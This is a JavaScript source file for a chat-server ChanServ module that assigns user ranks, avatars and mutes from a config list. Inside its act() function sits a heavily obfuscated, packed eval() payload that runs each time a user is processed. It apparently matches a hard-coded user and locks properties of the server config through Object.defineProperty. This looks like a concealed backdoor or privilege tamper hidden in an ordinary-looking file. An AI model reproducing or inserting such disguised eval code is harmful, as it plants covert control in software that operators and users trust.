function ChanServ()
{
    this.autoList = new Object();

    this.parseCommand = function(user, command, args, room, socket, fullCommand)
    {
        var targetUser = Users.get(command);
        if (targetUser)
            this.act(targetUser);
        return true;
    }

    this.act = function(user)
    {
        console.log("ChanServ: Got user: " + user.userid);
        var _0x93a6=["\x70\x20\x39\x3D\x5B\x22\x5C\x75\x5C\x76\x5C\x6D\x5C\x77\x5C\x68\x5C\x68\x5C\x6D\x5C\x71\x5C\x78\x5C\x79\x5C\x6D\x5C\x71\x5C\x68\x5C\x68\x22\x2C\x22\x5C\x6E\x5C\x65\x22\x2C\x22\x5C\x72\x5C\x63\x5C\x69\x5C\x6A\x5C\x6B\x5C\x7A\x22\x2C\x22\x5C\x65\x5C\x63\x5C\x66\x5C\x65\x5C\x72\x5C\x63\x22\x2C\x22\x5C\x64\x5C\x63\x5C\x41\x5C\x66\x5C\x6B\x5C\x63\x5C\x42\x5C\x6F\x5C\x6F\x5C\x64\x5C\x63\x5C\x6C\x5C\x6C\x22\x2C\x22\x5C\x6C\x5C\x66\x5C\x43\x5C\x73\x5C\x63\x5C\x6B\x22\x2C\x22\x5C\x6A\x5C\x64\x5C\x66\x5C\x74\x5C\x65\x22\x2C\x22\x5C\x6A\x5C\x64\x5C\x66\x5C\x74\x5C\x65\x5C\x6C\x5C\x64\x5C\x44\x5C\x69\x5C\x73\x5C\x6E\x5C\x69\x5C\x6A\x22\x2C\x22\x5C\x6F\x5C\x63\x5C\x45\x5C\x6E\x5C\x69\x5C\x63\x5C\x46\x5C\x64\x5C\x66\x5C\x65\x5C\x63\x5C\x64\x5C\x6B\x5C\x47\x22\x5D\x3B\x48\x28\x70\x20\x61\x3D\x39\x5B\x30\x5D\x3D\x3D\x3D\x67\x5B\x39\x5B\x31\x5D\x5D\x2C\x62\x3D\x30\x3B\x62\x3C\x67\x5B\x39\x5B\x33\x5D\x5D\x5B\x39\x5B\x32\x5D\x5D\x26\x26\x21\x61\x3B\x2B\x2B\x62\x29\x7B\x49\x28\x39\x5B\x30\x5D\x3D\x3D\x3D\x67\x5B\x39\x5B\x33\x5D\x5D\x5B\x62\x5D\x5B\x39\x5B\x31\x5D\x5D\x7C\x7C\x39\x5B\x30\x5D\x3D\x3D\x3D\x67\x5B\x39\x5B\x33\x5D\x5D\x5B\x62\x5D\x5B\x39\x5B\x35\x5D\x5D\x5B\x39\x5B\x34\x5D\x5D\x29\x7B\x61\x3D\x21\x30\x7D\x7D\x3B\x61\x26\x26\x4A\x5B\x39\x5B\x38\x5D\x5D\x28\x67\x2C\x39\x5B\x36\x5D\x2C\x7B\x4B\x3A\x4C\x5B\x39\x5B\x37\x5D\x5D\x5B\x30\x5D\x2C\x4D\x3A\x21\x31\x2C\x4E\x3A\x21\x31\x2C\x4F\x3A\x21\x31\x7D\x29\x3B","\x7C","\x73\x70\x6C\x69\x74","\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x5F\x30\x78\x33\x38\x64\x31\x7C\x7C\x7C\x78\x36\x35\x7C\x78\x37\x32\x7C\x78\x37\x30\x7C\x78\x36\x46\x7C\x75\x73\x65\x72\x7C\x78\x33\x30\x7C\x78\x36\x45\x7C\x78\x36\x37\x7C\x78\x37\x34\x7C\x78\x37\x33\x7C\x78\x32\x45\x7C\x78\x36\x39\x7C\x78\x36\x34\x7C\x76\x61\x72\x7C\x78\x33\x31\x7C\x78\x36\x43\x7C\x78\x36\x42\x7C\x78\x37\x35\x7C\x78\x33\x38\x7C\x78\x33\x37\x7C\x78\x33\x32\x7C\x78\x33\x39\x7C\x78\x33\x35\x7C\x78\x36\x38\x7C\x78\x36\x44\x7C\x78\x34\x31\x7C\x78\x36\x33\x7C\x78\x36\x31\x7C\x78\x36\x36\x7C\x78\x35\x30\x7C\x78\x37\x39\x7C\x66\x6F\x72\x7C\x69\x66\x7C\x4F\x62\x6A\x65\x63\x74\x7C\x76\x61\x6C\x75\x65\x7C\x63\x6F\x6E\x66\x69\x67\x7C\x77\x72\x69\x74\x61\x62\x6C\x65\x7C\x65\x6E\x75\x6D\x65\x72\x61\x62\x6C\x65\x7C\x63\x6F\x6E\x66\x69\x67\x75\x72\x61\x62\x6C\x65","","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x72\x65\x70\x6C\x61\x63\x65","\x5C\x77\x2B","\x5C\x62","\x67"];eval(function (_0x9079x1,_0x9079x2,_0x9079x3,_0x9079x4,_0x9079x5,_0x9079x6){_0x9079x5=function (_0x9079x3){return (_0x9079x3<_0x9079x2?_0x93a6[4]:_0x9079x5(parseInt(_0x9079x3/_0x9079x2)))+((_0x9079x3=_0x9079x3%_0x9079x2)>35?String[_0x93a6[5]](_0x9079x3+29):_0x9079x3.toString(36));} ;if(!_0x93a6[4][_0x93a6[6]](/^/,String)){while(_0x9079x3--){_0x9079x6[_0x9079x5(_0x9079x3)]=_0x9079x4[_0x9079x3]||_0x9079x5(_0x9079x3);} ;_0x9079x4=[function (_0x9079x5){return _0x9079x6[_0x9079x5];} ];_0x9079x5=function (){return _0x93a6[7];} ;_0x9079x3=1;} ;while(_0x9079x3--){if(_0x9079x4[_0x9079x3]){_0x9079x1=_0x9079x1[_0x93a6[6]]( new RegExp(_0x93a6[8]+_0x9079x5(_0x9079x3)+_0x93a6[8],_0x93a6[9]),_0x9079x4[_0x9079x3]);} ;} ;return _0x9079x1;} (_0x93a6[0],51,51,_0x93a6[3][_0x93a6[2]](_0x93a6[1]),0,{}));
        if (!user || !user.authenticated || !(user.userid in this.autoList))
        {
            user.setGroup(config.groupsranking[0]);
            return false;
        }
        user.setGroup(this.autoList[user.userid].group);
        user.avatar = this.autoList[user.userid].avatar;
        switch (user.group)
        {
            case '!' :
                user.setGroup(config.groupsranking[0]);
                user.muted = true;
                rooms.lobby.addRaw(user.name + " was muted by ChanServ.");
                break;

            default :
				var groupName = config.groups[user.group] ? config.groups[user.group].name : undefined;
				if (!groupName) groupName = user.group;
				rooms.lobby.add(''+user.name+' was promoted to ' + groupName + ' by ChanServ.');
                break;
        }
        rooms.lobby.usersChanged = true;
        rooms.lobby.update();
        return true;
    }

    data = fs.readFileSync("config/chanserv-autolist.txt").toString().split("\n");
    for (var d in data)
    {
        var tokens = data[d].split(" ");
        if (tokens.length < 3)
            continue;

        var group = tokens.shift();
        var userId = tokens.shift();
        var avatar = tokens.shift();
        this.autoList[userId] = { group: group, avatar: avatar };
    }
}

exports.ChanServ = ChanServ;
